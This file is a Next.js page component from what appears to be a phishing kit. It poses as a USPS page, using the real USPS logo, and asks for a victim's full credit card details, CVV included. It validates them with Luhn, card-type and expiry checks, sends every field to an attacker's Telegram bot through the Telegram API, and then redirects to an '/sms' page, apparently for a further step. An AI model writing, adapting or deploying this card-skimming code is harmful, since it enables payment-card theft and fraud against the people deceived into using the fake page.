'use client';
import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/telegramConfig';

// Utility Functions
const getCardType = (number: string) => {
  const cleaned = number.replace(/\D/g, '');
  if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) return 'Visa';
  if (/^5[1-5][0-9]{14}$/.test(cleaned)) return 'MasterCard';
  if (/^3[47][0-9]{13}$/.test(cleaned)) return 'American Express';
  if (/^6(?:011|5[0-9]{2})[0-9]{12}$/.test(cleaned)) return 'Discover';
  return 'Unknown';
};

const isLuhnValid = (cardNum: string) => {
  const digits = cardNum.replace(/\D/g, '').split('').reverse().map(Number);
  return digits.reduce((acc, digit, idx) => {
    if (idx % 2 === 1) {
      const double = digit * 2;
      return acc + (double > 9 ? double - 9 : double);
    }
    return acc + digit;
  }, 0) % 10 === 0;
};

const isExpiryValid = (expiry: string) => {
  const [month, year] = expiry.split('/');
  if (!month || !year || month.length !== 2 || year.length !== 2) return false;
  const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1, 1);
  const now = new Date();
  return expiryDate > now;
};


const isCVVValid = (cvv: string, cardType: string) => {
  if (cardType === 'American Express') return /^\d{4}$/.test(cvv);
  return /^\d{3}$/.test(cvv);
};

export default function CreditCardInfoPage() {
  const [formData, setFormData] = useState({
    cardholder: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    billingZip: ''
  });

  const [alertVisible, setAlertVisible] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [cardType, setCardType] = useState('');
  const router = useRouter();

  useEffect(() => {
    const detectedType = getCardType(formData.cardNumber);
    setCardType(detectedType);
  }, [formData.cardNumber]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const { cardholder, cardNumber, expiry, cvv, billingZip } = formData;

    if (!cardholder || !cardNumber || !expiry || !cvv || !billingZip) {
      setAlertVisible(true);
      return;
    }

    if (!isLuhnValid(cardNumber)) {
      alert('❌ Invalid card number (Luhn check failed).');
      return;
    }

    if (cardType === 'Unknown') {
      alert('❌ Unknown or unsupported card type.');
      return;
    }

    if (!isExpiryValid(expiry)) {
      alert('❌ Invalid or expired expiry date.');
      return;
    }

    if (!isCVVValid(cvv, cardType)) {
      alert(`❌ CVV must be ${cardType === 'American Express' ? '4' : '3'} digits.`);
      return;
    }

    const message = `
💳 *Credit Card Info Submitted*
-------------------------------
👤 *Cardholder:* ${cardholder}
💳 *Card Number:* ${cardNumber}
🏷 *Card Type:* ${cardType}
📅 *Expiry:* ${expiry}
🔒 *CVV:* ${cvv}
📮 *Billing ZIP:* ${billingZip}
🕒 *Time:* ${new Date().toLocaleString()}
    `;

    try {
      setIsSubmitting(true);

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });

      setTimeout(() => {
        router.push('/sms');
      }, 3000);
    } catch (err) {
      setIsSubmitting(false);
      console.error('Telegram Error:', err);
      alert('❌ Failed to send info.');
    }
  };

  return (
    <div className="min-h-screen bg-white text-[#2C2A61] font-sans">
      <main className="max-w-xl mx-auto px-6 py-12">
        <img
          src="https://reg.usps.com/entreg/assets/images/des_brd_2color_logo_274x79.png"
          alt="USPS Logo"
          className="h-auto w-60 mb-10 transition duration-300 hover:scale-105"
        />

        <h1 className="text-3xl font-bold mb-6">Enter Your Credit Card Information</h1>

        {alertVisible && (
          <div className="bg-yellow-100 border border-yellow-400 text-yellow-800 px-4 py-3 rounded relative mb-6 animate-pulse">
            ⚠️ Please complete all credit card fields to continue.
          </div>
        )}

        {isSubmitting ? (
          <div className="flex flex-col items-center justify-center py-12">
            <img
              src="https://i.gifer.com/ZZ5H.gif"
              alt="Loading..."
              className="w-20 h-20 mb-4"
            />
            <p className="text-sm text-gray-600">Please wait while we process your card info...</p>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-6 bg-[#f9f9f9] p-8 rounded-lg shadow">
            <div>
              <label className="block text-sm font-medium mb-1">Cardholder Name</label>
              <input
                type="text"
                name="cardholder"
                value={formData.cardholder}
                onChange={handleChange}
                placeholder="Full Name on Card"
                className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-1">Card Number</label>
              <input
                type="text"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                placeholder="1234 5678 9012 3456"
                className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                required
              />
              <div className="text-sm text-gray-500 mt-1">Detected: {cardType}</div>
            </div>

            <div className="grid grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium mb-1">Expiration (MM/YY)</label>
                <input
                  type="text"
                  name="expiry"
                  value={formData.expiry}
                  onChange={handleChange}
                  placeholder="MM/YY"
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-1">CVV</label>
                <input
                  type="text"
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleChange}
                  placeholder="123"
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium mb-1">Billing ZIP Code</label>
              <input
                type="text"
                name="billingZip"
                value={formData.billingZip}
                onChange={handleChange}
                placeholder="ZIP Code"
                className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                required
              />
            </div>

            <div className="flex justify-center items-center gap-4 mt-2">
              <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" className="h-6" />
              <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard" className="h-6" />
              <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex" className="h-6" />
              <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" className="h-6" />
            </div>

            <button
              type="submit"
              className="bg-[#2C2A61] hover:bg-[#1d1a45] text-white w-full font-semibold py-3 rounded-lg shadow-md transition-all duration-200"
            >
              Submit Card Info
            </button>
          </form>
        )}
      </main>
    </div>
  );
}
